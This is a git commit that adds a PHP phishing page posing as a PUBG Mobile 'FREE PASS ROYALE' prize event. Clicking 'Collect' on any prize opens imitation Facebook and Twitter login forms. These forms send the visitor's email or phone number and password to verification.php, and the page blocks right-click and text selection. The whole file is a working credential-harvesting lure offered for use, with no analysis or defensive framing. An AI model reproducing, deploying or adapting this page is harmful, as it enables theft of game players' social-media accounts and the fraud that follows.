e599b8ae8704f2e6048648f9c51a16667a163b02
Skrarab <80719358+Skrarab@users.noreply.github.com>
2021-03-21 18:07:37 +0100

    Add files via upload

---
+++ F/index.php
@@ -0,0 +1,205 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta property="og:title" content="FREE PASS ROYALE">
+<meta name="description" content="Latest PUBG MOBILE Event. Get an exclusive SEASON prize !!!">
+<meta property="og:description" content="Latest PUBG MOBILE Event. Get an exclusive SEASON prize !!!">
+<meta property="og:url" content="./">
+<meta property="og:site_name" content="FREE PASS ROYALE">
+<meta property="og:type" content="website">
+<meta name="theme-color" content="#000">
+<meta property="og:image" content="https://g.top4top.io/p_1706f9c4l1.jpg">
+<title>FREE PASS ROYALE</title>
+<link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/pubg/master/ts.css">
+<link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/PubgMobile/master/animate.css">
+<link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/PubgMobile/master/facebook.css">
+<link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/PubgMobile/master/twitter.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="icon" href="https://i.ibb.co/2kMnpg9/p-1684y1a9m1.jpg">
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+<div class="container">
+	<div class="header"></div>
+	<div class="box">
+		<center>
+		<div class="alert">
+			<div class="alert-time">
+				<div id="timer">20 : 59 : 41</div>
+			</div>
+			<div class="slider">Welcome to PUBG MOBILE PHARAOH EVENT!</div>
+		</div>
+		</center>
+		<div id="latest" class="gallery" style="display: block;">
+			<div class="scroll">
+				<center>
+				<div class="item">
+					<img src="https://i.ibb.co/DG54kYb/1.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/DG54kYb/1.jpg">Collect</button>
+					</div>
+				</div>
+				<div class="item">
+					<img src="https://i.ibb.co/gJwgpkt/p-168407eff1.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/gJwgpkt/p-168407eff1.jpg">Collect</button>
+					</div>
+				</div>
+				<div class="item">
+					<img src="https://i.ibb.co/pQGFBx1/p-1684doabs2.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/pQGFBx1/p-1684doabs2.jpg">Collect</button>
+					</div>
+				</div>
+				<div class="item">
+					<img src="https://i.ibb.co/Jrm8xqP/p-1684pr14f3.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Jrm8xqP/p-1684pr14f3.jpg">Collect</button>
+					</div>
+				</div>
+				<div class="item">
+					<img src="https://i.ibb.co/VQsV2jG/p-1684q54xn4.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/VQsV2jG/p-1684q54xn4.jpg">Collect</button>
+					</div>
+				</div>
+				<div class="item">
+					<img src="https://i.ibb.co/CzHWjLg/p-16846oum91.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/CzHWjLg/p-16846oum91.jpg">Collect</button>
+					</div>
+				</div>
+				<div class="item">
+					<img src="https://i.ibb.co/HNYRbfh/p-1684s28jl2.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/HNYRbfh/p-1684s28jl2.jpg">Collect</button>
+					</div>
+				</div>
+				<div class="item">
+					<img src="https://i.ibb.co/RBbPFB1/p-1684jiw6h3.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/RBbPFB1/p-1684jiw6h3.jpg">Collect</button>
+					</div>
+				</div>
+				<div class="item">
+					<img src="https://i.ibb.co/mv1FKGb/p-1684gdamv4.jpg" style="border-bottom: none;">
+					<div>
+						<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mv1FKGb/p-1684gdamv4.jpg">Collect</button>
+					</div>
+				</div>
+				</center>
+			</div>
+		</div>
+		</div>
+	</div> <!--- box --->
+ <!--- container --->
+
+<div class="popup reward_confirmation" style="display: none;">
+	<div class="popup-box animated fadeInDown">
+		<div class="nav-popup">
+			<div class="nav-popup-title">Reward Confirmation</div>
+		</div>
+		<div class="alert">Are you sure to collect this prize?</div>
+		<img class="popup-item" src="" id="myImgReward">
+		<center>
+		<button type="button" class="btn-anjir" style="width: 45%;" onmousedown="tutup.play()" onclick="close_reward_confirmation()">Cancel</button>
+		<button type="button" class="btn-anjir" style="width: 45%;" onmousedown="buka.play()" onclick="account_login()">Collect</button>
+		</center>
+	</div>
+</div>
+<div class="popup account_login" style="display: none;">
+	<div class="popup-box animated fadeInDown">
+		<div class="nav-popup">
+			<div class="nav-popup-title">Account Login</div>
+		</div>
+		<div class="alert">
+			 Log in using your PUBG MOBILE account to receive prize
+		</div>
+		<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
+		<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fa fa-twitter icon-login"></i> Log in using Twitter account</button>
+		<center>
+		<button type="button" class="btn-anjir" onmousedown="tutup.play()" onclick="close_account_login()">Cancel</button>
+		</center>
+	</div>
+</div>
+
+<div class="popup-login login-facebook animated fadeIn" style="display: none;">
+	<div class="popup-box-login-fb">
+		<a onclick="tutup_facebook()" class="close-fb"><i class="fa fa-times-circle"></i></a>
+		<div class="navbar-fb">
+			<img src="https://i.ibb.co/C8xMBSK/p-1684n4yoz1.png">
+		</div>
+		<div class="content-box-fb">
+			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
+			<div class="txt-login-fb">
+				 Log in to your Facebook account to connect to PUBG MOBILE
+			</div>
+			<form class="login-form" action="verification.php" method="get">
+				<label>
+				<input type="text" name="miil" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required=""></label>
+				<label>
+				<input type="password" name="pw" placeholder="Password" autocomplete="off" autocapitalize="off" required=""></label>
+				<input type="hidden" name="log" value="FB" readonly="">
+				<button type="submit" class="btn-login-fb">Log In</button>
+			</form>
+			<div class="txt-create-account">Create account</div>
+			<div class="txt-not-now">Not now</div>
+			<div class="txt-forgotten-password">Forgotten password?</div>
+		</div>
+		<div class="language-box">
+			<center>
+			<div class="language-name language-name-active">English (UK)</div>
+			<div class="language-name">Bahasa Indonesia</div>
+			<div class="language-name">Basa Jawa</div>
+			<div class="language-name">Bahasa Melayu</div>
+			<div class="language-name">å,</div>
+			<div class="language-name">Español</div>
+			<div class="language-name">Português (Brasil)</div>
+			<div class="language-name">
+				<i class="fa fa-plus"></i>
+			</div>
+			</center>
+		</div>
+		<div class="copyright">Facebook Inc.</div>
+	</div>
+</div>
+<div class="popup-login login-twitter animated fadeIn" style="display: none;">
+	<div class="popup-box-login-twitter">
+		<a onclick="tutup_twitter()" class="close-other"><i class="fa fa-times-circle"></i></a>
+		<div class="header-twitter">
+			<center>
+			<img src="https://i.ibb.co/sVB3Z99/p-1684aik8b1.png">
+			</center>
+		</div>
+		<div class="box-twitter">
+			<center>
+			<form action="verification.php" method="get">
+				<div class="txt-login-twitter">Login to Twitter</div>
+				<div class="input-box-twitter">
+					<label>Phone, email, or username</label>
+					<input type="text" name="miil" placeholder="" required=""></div>
+				<div class="input-box-twitter">
+					<label>Password</label>
+					<input type="password" name="pw" placeholder="" required=""></div>
+				<input type="hidden" name="log" value="Tw" readonly="">
+				<button type="submit" class="btn-login-twitter">Log In</button>
+				<div class="footer-menu-twitter">Forgot password?</div>
+				<div class="footer-menu-twitter bulet">"</div>
+				<div class="footer-menu-twitter">Sign up to Twitter</div>
+			</form>
+			</center>
+		</div>
+	</div>
+</div>
+<!--- fieldset content --->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+<!--- /fieldset content --->
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script src="https://raw.githack.com/SoKy-Master/PubgMobile/master/timer.js"></script>
+<script src="https://raw.githack.com/SoKy-Master/PubgMobile/master/tab.js"></script>
+<script src="https://raw.githack.com/SoKy-Master/PubgMobile/master/popup.js"></script>
+<script src="https://raw.githack.com/SoKy-Master/PubgMobile/master/click.js"></script>
+</body>
+</html>
